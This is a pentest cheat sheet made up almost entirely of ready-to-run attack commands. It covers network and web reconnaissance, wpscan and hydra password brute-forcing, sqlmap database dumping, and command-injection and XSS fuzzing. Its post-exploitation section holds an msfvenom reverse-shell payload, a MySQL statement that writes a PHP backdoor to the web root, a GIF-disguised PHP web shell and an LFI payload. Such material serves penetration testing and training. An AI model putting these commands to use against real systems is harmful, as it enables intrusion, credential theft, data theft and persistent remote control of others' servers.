# Pentest Cheat Sheet

## 1. Scanning & Information Gathering

### 1.1 Nmap
- **Full TCP port scan + scripts + version detection**  
  ```bash
  sudo nmap -sC -sV -T4 -v -p- --script=banner \
    -oN full_scan.txt  <TARGET_IP>
  ```
- **Specific port/service**  
  ```bash
  sudo nmap -p <PORT> \
    -sV --script <SCRIPT-NAME> <TARGET>
  ```
- **Common variants**  
  ```bash
  nmap -p- -sT -sV -A $IP
  nmap -p- -sC -sV $IP --open
  nmap -p- --script=vuln $IP
  ```
- **HTTP methods on a path**  
  ```bash
  nmap --script http-methods \
    --script-args http-methods.url-path='/website' <TARGET>
  ```
- **SMB shares enumeration**  
  ```bash
  nmap --script smb-enum-shares <TARGET>
  ```

### 1.2 Gobuster
- **Directory brute‑force**  
  ```bash
  gobuster dir \
    -u http[s]://<TARGET> \
    -w /usr/share/wordlists/dirb/common.txt \
    -e -x php,html,txt \
    -t 50 \
    -s 200,204,301,302 \
    -k -v \
    -o gobuster_dir.txt
  ```
- **File extensions only**  
  ```bash
  gobuster dir \
    -u http[s]://<TARGET> \
    -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt \
    -k -t 30 \
    -o gobuster_files.txt
  ```
- **Subdomain brute‑force (DNS)**  
  ```bash
  gobuster dns \
    -d domain.org \
    -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
    -t 30
  ```
  _Tip: Verify each DNS result resolves to an in‑scope IP before testing._

### 1.3 Other Recon
- **Extract IPs from arbitrary files**  
  ```bash
  grep -oE '((1?[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9]{1,2}|2[0-4][0-9]|25[0-5])' FILE
  ```
- **Social/email harvest with TheHarvester**  
  ```bash
  theharvester -d domain.org -l 500 -b google
  ```
- **DNS reconnaissance**  
  ```bash
  dnsrecon -d yourdomain.com
  ```

## 2. Stable Interactive Shell
1. **Spawn PTY shell**  
   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   # or
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
2. **Adjust environment**  
   ```bash
   export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
   export TERM=xterm-256color
   alias ll='ls -lsaht --color=auto'
   ```
3. **Background → foreground + raw mode**  
   ```
   Ctrl+Z
   stty raw -echo; fg; reset
   stty columns 200 rows 200
   ```

## 3. Web Application Testing

### 3.1 WPScan (WordPress)
- **Basic enumeration**  
  ```bash
  wpscan --url $URL \
    --disable-tls-checks \
    --enumerate p,t,u
  ```
- **Brute‑force users**  
  ```bash
  wpscan --url $URL \
    --disable-tls-checks \
    -U users.txt \
    -P /usr/share/wordlists/rockyou.txt
  ```
- **Aggressive plugin detection**  
  ```bash
  wpscan --url $URL \
    --enumerate p \
    --plugins-detection aggressive
  ```

### 3.2 Nikto
```bash
nikto --host $IP -ssl -evasion 1
```
_See Nikto docs for other evasion modalities._

### 3.3 Wfuzz
- **XSS fuzzing**  
  ```bash
  wfuzz -c \
    -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt \
    "$URL"
  wfuzz -c \
    -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt \
    "$URL"
  ```
- **Command injection (POST)**  
  ```bash
  wfuzz -c \
    -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt \
    -d "doi=FUZZ" "$URL"
  ```
- **Parameter discovery**  
  ```bash
  wfuzz -c \
    -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
    "$URL"
  ```
- **Authenticated directory/file fuzzing**  
  ```bash
  wfuzz -c \
    -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
    --hc 404 \
    -d "SESSIONID=value" "$URL"
  wfuzz -c \
    -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt \
    --hc 404 \
    -d "SESSIONID=value" "$URL"
  ```
- **Large wordlists**  
  ```bash
  wfuzz -c \
    -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt \
    --hc 404 "$URL"
  ```

### 3.4 Commix
```bash
commix \
  --url="https://target.com?param=" \
  --level=3 \
  --force-ssl \
  --skip-waf \
  --random-agent
```

### 3.5 SQLMap
- **Basic test**  
  ```bash
  sqlmap -u $URL \
    --threads=2 \
    --time-sec=10 \
    --level=2 \
    --risk=2 \
    --technique=T \
    --force-ssl
  ```
- **Dump all data**  
  ```bash
  sqlmap -u $URL \
    --threads=2 \
    --time-sec=10 \
    --level=4 \
    --risk=3 \
    --dump
  ```

## 4. Mail & User Enumeration
```bash
smtp-user-enum -M VRFY \
  -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt \
  -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP
```

## 5. Post‑Exploitation

### 5.1 Reverse Shell (Metasploit)
```bash
msfvenom -p cmd/unix/reverse_bash \
  LHOST=<YOUR_IP> LPORT=<YOUR_PORT> \
  -f raw > reverse.sh
```

### 5.2 Simple HTTP File Server
```bash
python3 -m http.server 8000
```

### 5.3 Command Execution Verification
```bash
tcpdump -i any -c5 icmp
```

### 5.4 MySQL INTO OUTFILE Backdoor
```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE "/var/www/WEBDIR/backdoor.php";
```

### 5.5 Local File Inclusion (LFI)
```
php://filter/convert.base64-encode/resource=<FILE>
```

### 5.6 Image‑based Web Shell Upload
```
GIF89a1
<?php system($_POST["cmd"]); ?>
```

## 6. Network Discovery
```bash
netdiscover -r 0.0.0.0/24
```

## 7. SMB protocol (file sharing between different operating systems)

### 7.1 Look for shares 
```bash
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares $IP
```
or
```bash
smbclient -L //$IP
```

### 7.2 Looking for null session 
```bash
smbclient //$IP/IPC$ -N
```
or
```bash
enum4linux -a $IP
```
### 7.3 General info 
```bash
enum4linux $IP
```

## FTP protocol 
```bash
ftp $IP
```

## Hydra SSH (to be used when you have a user name)
```bash
hydra -l users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -t 4 -f -V \
      ssh://$IP
```

## SMPT (Simple Mail Transfer Protocol) 
### Banner & Version*
   ```bash
   nc TARGET 25
   HELO me
   ```
## Check if the exploit work with tcpdump 
```bash
sudo tcpdump -i tun0 -n -vv icmp
```
